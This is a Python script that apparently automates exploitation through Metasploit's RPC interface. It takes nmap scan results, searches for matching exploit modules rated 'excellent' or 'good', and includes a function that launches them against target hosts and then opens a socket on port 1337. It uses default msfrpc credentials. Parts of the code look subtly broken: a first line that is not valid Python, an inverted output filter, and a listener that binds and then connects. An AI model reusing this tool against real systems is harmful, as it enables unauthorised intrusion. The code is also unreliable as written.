import packages
from network import msfrpc
import time
import sys
import socket

# Object for the msfrpc client
client = None

def initiate(data,host):
    print('Initiating msfrpc session')
    ip = "127.0.0.1"
    user = "msf"
    # Change this password if you've entered a custom password for msfrpc
    passwd = "msfmsf"
    try:
        global client
        client = msfrpc.Client(ip,user,passwd)
    except:
        print('msfrpc session failed. Did you load the msgrpc plugin and set the password accordingly?')
        sys.exit(1)
    for target in data:
        find_exploits(data[target], target, host)

# data: dict of nmap scan results from current target
# target: ip address of the current target
def find_exploits(data, target, host):
    print('Starting exploit on ' + target)
    console = client.create_console()
    # Get the console id
    con_id = int(str(console[b'id']).strip()[2:-1])
    print('Console ID: ' + str(con_id))
    client.read_console(con_id)
    # print(client.run_module())
    for port in data:
        if (port == 'os'):
            continue
        service = data[port][1]
        version = data[port][2]
        os = data['os']
        if data[port][0] == 'closed' or service == '':
            continue

        print("Searching exploits for {0} {1}".format(service, version))
        client.read_console(con_id)
        search = "search {0} {1} {2}".format(service, version, os)
        client.write_console(con_id, search)

        # Sleep 1 second for Metasploit to load relevant exploits
        time.sleep(1)
        res = client.read_console(con_id)
        # print(res)
        exploits = analyze(target, res, os)
        # for exp in exploits:
            # exploit(target, port, exp, host)
    client.destroy_console(con_id)

def normalize_exploits(exp):
    toprint = exp[b'data']
    lines = toprint.decode().split('\n')
    ret = []
    for line in lines:
        # if not (line == '' or '-----' in line or '=======' in line or 'Matching Modules' in line or 'Disclosure Date' in line):
        if not (all(x in line for x in ['', '-----', '=======', 'Matching Modules', 'Disclosure Date'])):
            ret.append(line)
    return ret

def analyze(target, exp, os):
    lines = normalize_exploits(exp)
    ret = []
    # print('\n\n\n\n')
    for line in lines:
        # if not ('exploit' in line or 'excellent' in line):
        # if (all(x in line for x in ['exploit', 'excellent', 'good'])) and any(x in line for x in [os,'multi']):
        if('exploit' in line and any(x in line for x in ['excellent', 'good']) and any(x in line for x in [os,'multi'])):
            name = line.strip().split(' ', 1)[0]
            ret.append(name)
            print(line)
    return ret

# target: ip address of current target
# port: port for current exploit
# exploit: Name of current exploit
def exploit(target, port, exploit, host):
    print('Exploiting {}'.format(exploit))
    print(client.run_module('exploit', exploit, target, port, host))
    listen_ncat(target,port)

def listen_ncat(target, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    listener.bind(('', 1337))
    listener.connect((target,port))
    #sock, addr = listener.accept()
    time.sleep(1)
    while True:
        data = listener.recv(1024)
        if not data: break
        print(data)
    listener.shutdown(socket.SHUT_RDWR)
    listener.close()